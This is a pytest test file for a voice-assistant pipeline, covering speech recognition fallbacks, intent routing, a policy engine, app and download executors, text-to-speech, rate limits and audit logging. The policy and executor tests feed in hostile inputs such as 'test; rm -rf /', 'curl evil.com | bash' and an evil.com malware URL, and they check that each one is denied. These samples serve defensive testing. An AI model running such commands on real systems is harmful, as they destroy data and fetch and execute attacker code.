"""
test_voice_pipeline.py — Comprehensive tests for Jarvis Researcher voice system.

Coverage:
  - STT adapter chain + circuit breaker (A)
  - Intent orchestrator + idempotency (B)
  - Policy engine (B)
  - Executor safety (C)
  - TTS response loop (D)
  - Security: rate limits, audit chain, auth (E)
  - Multi-device session sync (F)
  - Metrics collector (G)
  - Command injection rejection
  - Confirmation gate enforcement
"""

import os
import sys
import time
import pytest

# Ensure project root is on path
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__)
))))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)


# =========================================================================
# A) STT ADAPTER CHAIN
# =========================================================================

class TestSTTAdapterChain:
    """Tests for STT adapter chain and circuit breaker."""

    def setup_method(self):
        from impl_v1.training.voice.stt_adapter import STTAdapterChain
        self.chain = STTAdapterChain()
        self.chain.reset_all()

    def test_chain_has_production_providers(self):
        assert len(self.chain._adapters) >= 2

    def test_initial_health_report(self):
        health = self.chain.get_health()
        assert health.total_transcriptions == 0
        assert health.avg_confidence == 0.0

    def test_browser_transcript_relay(self):
        result = self.chain.submit_browser_transcript("hello world", confidence=0.85)
        assert result.text == "hello world"
        assert result.confidence == 0.85
        assert result.provider.value == "BROWSER_WEBSPEECH"

    def test_browser_transcript_increments_count(self):
        self.chain.submit_browser_transcript("test")
        health = self.chain.get_health()
        assert health.total_transcriptions == 1

    def test_circuit_breaker_initial_state(self):
        from impl_v1.training.voice.stt_adapter import CircuitBreaker
        cb = CircuitBreaker("test")
        assert cb.state == "CLOSED"
        assert cb.is_available is True

    def test_circuit_breaker_opens_after_failures(self):
        from impl_v1.training.voice.stt_adapter import CircuitBreaker
        cb = CircuitBreaker("test", failure_threshold=3)
        cb.record_failure()
        cb.record_failure()
        assert cb.state == "CLOSED"
        cb.record_failure()
        assert cb.state == "OPEN"
        assert cb.is_available is False

    def test_circuit_breaker_recovers(self):
        from impl_v1.training.voice.stt_adapter import CircuitBreaker
        cb = CircuitBreaker("test", failure_threshold=1, recovery_timeout_s=0.1)
        cb.record_failure()
        assert cb.state == "OPEN"
        time.sleep(0.15)
        assert cb.state == "HALF_OPEN"
        assert cb.is_available is True

    def test_circuit_breaker_success_resets(self):
        from impl_v1.training.voice.stt_adapter import CircuitBreaker
        cb = CircuitBreaker("test", failure_threshold=3)
        cb.record_failure()
        cb.record_failure()
        cb.record_success()
        assert cb.state == "CLOSED"

    def test_get_stt_status(self):
        from impl_v1.training.voice.stt_adapter import get_stt_status
        status = get_stt_status()
        assert "active_provider" in status
        assert "provider_status" in status
        assert "local_service" in status
        assert "candidate_checkpoints" in status["local_service"] or status["local_service"] == {}

    def test_active_provider_falls_back(self):
        """When primary circuits are all open, active_provider still returns something."""
        active = self.chain.active_provider
        assert active is not None


# =========================================================================
# B) INTENT ORCHESTRATOR
# =========================================================================

class TestIntentOrchestrator:
    """Tests for voice intent orchestrator."""

    def setup_method(self):
        from impl_v1.training.voice.voice_intent_orchestrator import VoiceIntentOrchestrator
        self.orch = VoiceIntentOrchestrator()
        self.orch.clear()

    def test_process_transcript_returns_intent(self):
        intent = self.orch.process_transcript("what is the status", "user1", "dev1")
        assert intent.intent_id.startswith("INT-")
        assert intent.user_id == "user1"
        assert intent.route_mode == "SECURITY"

    def test_research_query_routes_to_research_mode(self):
        intent = self.orch.process_transcript("what's latest AI news", "user1", "dev1")
        assert intent.command_type == "RESEARCH_QUERY"
        assert intent.route_mode == "RESEARCH"
        assert intent.args["query"] == "what's latest AI news"

    def test_host_action_routes_with_signed_session(self):
        intent = self.orch.process_transcript(
            "open notepad",
            "user1",
            "dev1",
            context_args={"host_session_id": "HAG-TEST"},
        )
        assert intent.command_type == "LAUNCH_APP"
        assert intent.route_mode == "HOST_ACTION"
        assert intent.args["app"] == "notepad"
        assert intent.args["host_session_id"] == "HAG-TEST"

    def test_focus_command_routes_to_assistant_mode(self):
        intent = self.orch.process_transcript(
            "focus on finish the current project",
            "user1",
            "dev1",
        )
        assert intent.command_type == "SET_OBJECTIVE"
        assert intent.route_mode == "ASSISTANT"
        assert intent.args["title"] == "finish the current project"

    def test_objective_status_routes_to_assistant_mode(self):
        intent = self.orch.process_transcript(
            "what is current objective",
            "user1",
            "dev1",
        )
        assert intent.command_type == "OBJECTIVE_STATUS"
        assert intent.route_mode == "ASSISTANT"

    def test_low_risk_no_confirmation(self):
        intent = self.orch.process_transcript("what is the status", "user1", "dev1")
        assert intent.requires_confirmation is False

    def test_high_risk_requires_confirmation(self):
        intent = self.orch.process_transcript("start training", "user1", "dev1")
        # SCREEN_TAKEOVER, START_TRAINING etc. are HIGH risk
        if intent.risk_level.value in ("HIGH", "CRITICAL"):
            assert intent.requires_confirmation is True

    def test_idempotency_dedup(self):
        i1 = self.orch.process_transcript("what is the status", "user1", "dev1")
        i2 = self.orch.process_transcript("what is the status", "user1", "dev1")
        assert i2.error is not None
        assert "DUPLICATE" in i2.error

    def test_confirm_intent(self):
        intent = self.orch.process_transcript("take over the screen", "user1", "dev1")
        if intent.requires_confirmation:
            success = self.orch.confirm_intent(intent.intent_id, "admin")
            assert success is True

    def test_reject_intent(self):
        intent = self.orch.process_transcript("something risky", "user1", "dev1")
        success = self.orch.reject_intent(intent.intent_id, "not allowed")
        assert success is True

    def test_stats_tracking(self):
        self.orch.process_transcript("test", "u1", "d1")
        stats = self.orch.get_stats()
        assert stats["processed"] >= 1

    def test_unknown_command_is_critical(self):
        from impl_v1.training.voice.voice_intent_orchestrator import classify_intent_risk, RiskLevel
        risk = classify_intent_risk("UNKNOWN")
        assert risk == RiskLevel.CRITICAL


# =========================================================================
# B) POLICY ENGINE
# =========================================================================

class TestPolicyEngine:
    """Tests for voice policy engine."""

    def setup_method(self):
        from impl_v1.training.voice.voice_policy_engine import VoicePolicyEngine
        self.engine = VoicePolicyEngine()
        self.engine.reset()

    def test_status_query_allowed(self):
        decision = self.engine.evaluate("QUERY_STATUS", {})
        assert decision.verdict.value == "ALLOWED"

    def test_blocked_app_denied(self, tmp_path, monkeypatch):
        monkeypatch.setenv("YGB_APPROVAL_SECRET", "voice-policy-secret")
        from backend.governance.host_action_governor import HostActionGovernor

        ledger_path = tmp_path / "host_action_ledger.jsonl"
        governor = HostActionGovernor(ledger_path=ledger_path)
        session = governor.issue_session(
            requested_by="user1",
            approver_id="admin1",
            reason="Allow only trusted apps",
            allowed_actions=["LAUNCH_APP"],
            allowed_apps=["notepad"],
        )
        monkeypatch.setattr(
            "backend.governance.host_action_governor.HOST_ACTION_LEDGER_PATH",
            ledger_path,
        )

        decision = self.engine.evaluate(
            "LAUNCH_APP",
            {"app": "malware.exe", "host_session_id": session.session_id},
        )
        assert decision.verdict.value == "DENIED"
        assert "unknown" in decision.reason.lower() or "allowed" in decision.reason.lower()

    def test_host_action_requires_signed_session(self):
        decision = self.engine.evaluate("LAUNCH_APP", {"app": "notepad"})
        assert decision.verdict.value == "REQUIRES_OVERRIDE"

    def test_allowed_app_passes_with_signed_session(self, tmp_path, monkeypatch):
        monkeypatch.setenv("YGB_APPROVAL_SECRET", "voice-policy-secret")
        from backend.governance.host_action_governor import HostActionGovernor

        ledger_path = tmp_path / "host_action_ledger.jsonl"
        monkeypatch.setattr(
            HostActionGovernor,
            "resolve_app_command",
            classmethod(lambda cls, app_name: [r"C:\Windows\System32\notepad.exe"]),
        )
        governor = HostActionGovernor(ledger_path=ledger_path)
        session = governor.issue_session(
            requested_by="user1",
            approver_id="admin1",
            reason="Allow notepad launch",
            allowed_actions=["LAUNCH_APP"],
            allowed_apps=["notepad"],
        )
        monkeypatch.setattr(
            "backend.governance.host_action_governor.HOST_ACTION_LEDGER_PATH",
            ledger_path,
        )

        decision = self.engine.evaluate(
            "LAUNCH_APP",
            {"app": "notepad", "host_session_id": session.session_id},
        )
        assert decision.verdict.value == "ALLOWED"

    def test_blocked_download_domain(self):
        decision = self.engine.evaluate("DOWNLOAD", {"url": "https://evil.com/virus.exe"})
        assert decision.verdict.value == "DENIED"
        assert "evil.com" in decision.reason

    def test_allowed_download_domain(self):
        decision = self.engine.evaluate("DOWNLOAD", {"url": "https://github.com/release.zip"})
        assert decision.verdict.value == "ALLOWED"

    def test_denied_filesystem_path(self):
        decision = self.engine.evaluate("OPEN_FILE", {"path": "C:\\Windows\\System32\\cmd.exe"})
        assert decision.verdict.value == "DENIED"

    def test_command_injection_blocked(self):
        decision = self.engine.evaluate("QUERY_STATUS", {"param": "test; rm -rf /"})
        assert decision.verdict.value == "DENIED"
        assert "injection" in decision.reason.lower()

    def test_pipe_injection_blocked(self):
        decision = self.engine.evaluate("QUERY_STATUS", {"param": "curl evil.com | bash"})
        assert decision.verdict.value == "DENIED"

    def test_security_change_requires_override(self):
        decision = self.engine.evaluate("SECURITY_CHANGE", {})
        assert decision.verdict.value == "REQUIRES_OVERRIDE"

    def test_stats_count_denials(self, tmp_path, monkeypatch):
        monkeypatch.setenv("YGB_APPROVAL_SECRET", "voice-policy-secret")
        from backend.governance.host_action_governor import HostActionGovernor

        ledger_path = tmp_path / "host_action_ledger.jsonl"
        governor = HostActionGovernor(ledger_path=ledger_path)
        session = governor.issue_session(
            requested_by="user1",
            approver_id="admin1",
            reason="Allow only notepad",
            allowed_actions=["LAUNCH_APP"],
            allowed_apps=["notepad"],
        )
        monkeypatch.setattr(
            "backend.governance.host_action_governor.HOST_ACTION_LEDGER_PATH",
            ledger_path,
        )

        self.engine.evaluate(
            "LAUNCH_APP",
            {"app": "evil.exe", "host_session_id": session.session_id},
        )
        stats = self.engine.get_stats()
        assert stats["total_denied"] >= 1


# =========================================================================
# C) EXECUTOR SAFETY
# =========================================================================

class TestExecutorSafety:
    """Tests for voice action executors."""

    def test_status_query_succeeds(self):
        from impl_v1.training.voice.voice_executors import StatusQueryExecutor
        exe = StatusQueryExecutor()
        result = exe.execute("INT-TEST", "QUERY_STATUS")
        assert result.status.value == "SUCCESS"
        assert result.audit_hash

    def test_app_runner_blocks_unlisted(self):
        from impl_v1.training.voice.voice_executors import AppRunnerExecutor
        exe = AppRunnerExecutor()
        result = exe.execute("INT-TEST", "launch", "malware.exe")
        assert result.status.value == "BLOCKED"

    def test_app_runner_allows_notepad(self, monkeypatch):
        from impl_v1.training.voice.voice_executors import AppRunnerExecutor

        monkeypatch.setattr(
            "impl_v1.training.voice.voice_executors.safe_popen",
            lambda *args, **kwargs: object(),
        )
        exe = AppRunnerExecutor()
        result = exe.execute(
            "INT-TEST",
            "launch",
            "notepad",
            launch_command=[r"C:\Windows\System32\notepad.exe"],
        )
        assert result.status.value == "SUCCESS"

    def test_download_blocks_unlisted_domain(self):
        from impl_v1.training.voice.voice_executors import DownloadExecutor
        exe = DownloadExecutor()
        result = exe.execute("INT-TEST", "https://evil.com/virus.exe")
        assert result.status.value == "BLOCKED"

    def test_download_allows_github(self):
        from impl_v1.training.voice.voice_executors import DownloadExecutor
        exe = DownloadExecutor()
        result = exe.execute("INT-TEST", "https://github.com/release.zip")
        # BLOCKED because download pipeline not wired, but domain is accepted
        assert "BLOCKED" in result.output
        assert "evil" not in result.output.lower()

    def test_browser_blocks_unlisted_domain(self):
        from impl_v1.training.voice.voice_executors import BrowserExecutor
        exe = BrowserExecutor()
        result = exe.execute("INT-TEST", "https://evil.com/phishing")
        assert result.status.value == "BLOCKED"

    def test_all_executors_have_audit_hash(self):
        from impl_v1.training.voice.voice_executors import StatusQueryExecutor
        exe = StatusQueryExecutor()
        result = exe.execute("INT-AUDIT", "QUERY_STATUS")
        assert len(result.audit_hash) == 32  # SHA-256 truncated


# =========================================================================
# D) TTS RESPONSE LOOP
# =========================================================================

class TestTTSLoop:
    """Tests for TTS streaming engine."""

    def test_tts_speak_returns_response(self, monkeypatch):
        from impl_v1.training.voice.tts_streaming import TTSEngine, ResponseType
        tts = TTSEngine()
        monkeypatch.setattr(
            tts,
            "_deliver_chunk",
            lambda text, response_type: (True, "https://tts.example/audio", None),
        )
        response = tts.speak("Test message")
        assert response.text == "Test message"
        assert response.response_type == ResponseType.SUCCESS
        assert response.status.value == "IDLE"
        assert response.audio_url is not None

    def test_tts_stream_health_continues_after_single_chunk_failure(self, monkeypatch):
        from impl_v1.training.voice.tts_streaming import TTSEngine

        tts = TTSEngine()
        monkeypatch.setattr(tts, "_chunk_text", lambda text: ["chunk-1", "chunk-2", "chunk-3"])
        outcomes = iter(
            [
                (False, None, "chunk-1-failed"),
                (True, "https://tts.example/chunk-2", None),
                (True, "https://tts.example/chunk-3", None),
            ]
        )
        monkeypatch.setattr(tts, "_deliver_chunk", lambda text, response_type: next(outcomes))

        response = tts.speak("One. Two. Three.")
        health = next(iter(tts.get_stream_health().values()))

        assert response.status.value == "IDLE"
        assert health["failed_chunks"] == 1
        assert health["delivered_chunks"] == 2
        assert health["consecutive_failures"] == 0
        assert health["aborted"] is False

    def test_tts_stream_aborts_after_three_consecutive_chunk_failures(self, monkeypatch):
        from impl_v1.training.voice.tts_streaming import TTSEngine

        tts = TTSEngine()
        monkeypatch.setattr(tts, "_chunk_text", lambda text: ["chunk-1", "chunk-2", "chunk-3", "chunk-4"])
        monkeypatch.setattr(
            tts,
            "_deliver_chunk",
            lambda text, response_type: (False, None, f"{text}-failed"),
        )

        response = tts.speak("One. Two. Three. Four.")
        health = next(iter(tts.get_stream_health().values()))

        assert response.status.value == "ERROR"
        assert health["aborted"] is True
        assert health["failed_chunks"] == 3
        assert health["last_error"].startswith("STREAM_ABORTED")
        assert tts.get_stats()["total_errors"] == 1

    def test_tts_interrupt(self):
        from impl_v1.training.voice.tts_streaming import TTSEngine
        tts = TTSEngine()
        tts._status = tts._status.__class__("SPEAKING")  # Simulate speaking
        assert tts.interrupt() is True

    def test_response_templates(self):
        from impl_v1.training.voice.tts_streaming import format_response, ResponseType
        msg = format_response(ResponseType.SUCCESS, action="Training")
        assert "Training" in msg
        assert "success" in msg.lower()

    def test_blocked_response_template(self):
        from impl_v1.training.voice.tts_streaming import format_response, ResponseType
        msg = format_response(ResponseType.BLOCKED, action="Download", reason="Domain blocked")
        assert "blocked" in msg.lower()

    def test_interrupt_hotwords(self):
        from impl_v1.training.voice.tts_streaming import is_interrupt_command
        assert is_interrupt_command("stop speaking") is True
        assert is_interrupt_command("quiet") is True
        assert is_interrupt_command("keep going") is False

    def test_tts_stats(self, monkeypatch):
        from impl_v1.training.voice.tts_streaming import TTSEngine
        monkeypatch.setenv("YGB_TEST_MODE", "true")
        tts = TTSEngine()
        stats = tts.get_stats()
        assert "status" in stats
        assert "active_provider" in stats
        assert "provider_health" in stats


# =========================================================================
# E) SECURITY
# =========================================================================

class TestVoiceSecurity:
    """Tests for voice security: rate limits, audit chain, lockout."""

    def test_rate_limit_allows_normal_usage(self):
        from impl_v1.training.voice.voice_security import VoiceRateLimiter
        rl = VoiceRateLimiter()
        rl.reset()
        allowed, _ = rl.is_allowed("user1", "dev1")
        assert allowed is True

    def test_rate_limit_blocks_excess(self):
        from impl_v1.training.voice.voice_security import VoiceRateLimiter
        rl = VoiceRateLimiter()
        rl.reset()
        for _ in range(rl.USER_LIMIT):
            rl.is_allowed("user1", "dev1")
        allowed, reason = rl.is_allowed("user1", "dev1")
        assert allowed is False
        assert "rate limit" in reason.lower()

    def test_device_rate_limit(self):
        from impl_v1.training.voice.voice_security import VoiceRateLimiter
        rl = VoiceRateLimiter()
        rl.reset()
        for i in range(rl.DEVICE_LIMIT):
            rl.is_allowed(f"user_{i}", "shared_dev")
        allowed, reason = rl.is_allowed("user_extra", "shared_dev")
        assert allowed is False
        assert "device" in reason.lower()

    def test_auth_failure_lockout(self):
        from impl_v1.training.voice.voice_security import VoiceRateLimiter
        rl = VoiceRateLimiter()
        rl.reset()
        for _ in range(rl.AUTH_FAIL_LOCKOUT):
            rl.record_auth_failure("bad_user")
        allowed, _ = rl.is_allowed("bad_user", "dev")
        assert allowed is False

    def test_audit_chain_integrity(self):
        from impl_v1.training.voice.voice_security import VoiceAuditLog
        log = VoiceAuditLog()
        log.clear()
        log.log("u1", "d1", "test1", "QUERY", "status", "ALLOWED", "OK")
        log.log("u1", "d1", "test2", "QUERY", "status", "ALLOWED", "OK")
        assert log.verify_chain() is True

    def test_audit_chain_detects_tampering(self):
        from impl_v1.training.voice.voice_security import VoiceAuditLog
        log = VoiceAuditLog()
        log.clear()
        log.log("u1", "d1", "test1", "QUERY", "status", "ALLOWED", "OK")
        # Tamper with entry
        if log._entries:
            log._entries[0].transcript = "TAMPERED"
        assert log.verify_chain() is False

    def test_privacy_mode_redaction(self):
        from impl_v1.training.voice.voice_security import VoiceAuditLog
        log = VoiceAuditLog()
        log.clear()
        entry = log.log("u1", "d1", "my secret password", "QUERY",
                        "status", "ALLOWED", "OK", redact=True)
        assert entry.transcript == "[REDACTED]"


# =========================================================================
# F) MULTI-DEVICE SESSION SYNC
# =========================================================================

class TestSessionSync:
    """Tests for multi-device session synchronization."""

    def setup_method(self):
        from impl_v1.training.voice.voice_session_sync import VoiceSessionManager
        self.mgr = VoiceSessionManager()
        self.mgr.clear()

    def test_register_device(self):
        session = self.mgr.register_device("dev1", "user1")
        assert session.device_id == "dev1"
        assert session.is_primary is True

    def test_second_device_demotes_first(self):
        self.mgr.register_device("dev1", "user1")
        self.mgr.register_device("dev2", "user1")
        devices = self.mgr.get_active_devices("user1")
        primaries = [d for d in devices if d["is_primary"]]
        assert len(primaries) == 1
        assert primaries[0]["device_id"] == "dev2"

    def test_submit_command_accepted(self):
        self.mgr.register_device("dev1", "user1")
        result = self.mgr.submit_command("dev1", "key1", 1)
        assert result.accepted is True

    def test_duplicate_command_rejected(self):
        self.mgr.register_device("dev1", "user1")
        self.mgr.submit_command("dev1", "key1", 1)
        result = self.mgr.submit_command("dev1", "key1", 2)
        assert result.accepted is False
        assert "Duplicate" in result.reason

    def test_stale_sequence_rejected(self):
        self.mgr.register_device("dev1", "user1")
        self.mgr.submit_command("dev1", "key1", 5)
        result = self.mgr.submit_command("dev1", "key2", 1)
        assert result.accepted is False
        assert "Stale" in result.reason

    def test_unregistered_device_rejected(self):
        result = self.mgr.submit_command("unknown", "key1", 1)
        assert result.accepted is False


# =========================================================================
# G) METRICS
# =========================================================================

class TestVoiceMetrics:
    """Tests for voice metrics collector."""

    def setup_method(self):
        from impl_v1.training.voice.voice_metrics import VoiceMetricsCollector
        self.mc = VoiceMetricsCollector()
        self.mc.clear()

    def test_initial_metrics_empty(self):
        health = self.mc.get_health()
        assert health["total_commands"] == 0
        assert health["success_rate"] == 0.0

    def test_record_success(self):
        from impl_v1.training.voice.voice_metrics import VoiceTimings
        self.mc.record_timing(VoiceTimings(
            command_id="cmd1", total_ms=120.0, success=True
        ))
        assert self.mc.success_rate == 1.0

    def test_record_failure_by_stage(self):
        from impl_v1.training.voice.voice_metrics import VoiceTimings
        self.mc.record_timing(VoiceTimings(
            command_id="cmd1", success=False, stage_failed="STT"
        ))
        health = self.mc.get_health()
        assert health["failures_by_stage"]["STT"] == 1

    def test_confidence_tracking(self):
        self.mc.record_confidence(0.9)
        self.mc.record_confidence(0.8)
        assert abs(self.mc.avg_confidence - 0.85) < 0.01

    def test_policy_block_count(self):
        self.mc.record_policy_block()
        self.mc.record_policy_block()
        health = self.mc.get_health()
        assert health["blocked_by_policy"] == 2

    def test_latency_percentiles(self):
        from impl_v1.training.voice.voice_metrics import VoiceTimings
        for i in range(100):
            self.mc.record_timing(VoiceTimings(
                command_id=f"cmd{i}", total_ms=float(i + 50), success=True
            ))
        percs = self.mc.get_latency_percentiles()
        assert percs["p50"] > 0
        assert percs["p95"] > percs["p50"]

    def test_slo_check(self):
        from impl_v1.training.voice.voice_metrics import VoiceTimings
        for i in range(100):
            self.mc.record_timing(VoiceTimings(
                command_id=f"cmd{i}", total_ms=100.0, success=True
            ))
        assert self.mc.get_health()["slo_met"] is True

    def test_get_voice_health_function(self):
        from impl_v1.training.voice.voice_metrics import get_voice_health
        health = get_voice_health()
        assert "total_commands" in health
        assert "timestamp" in health
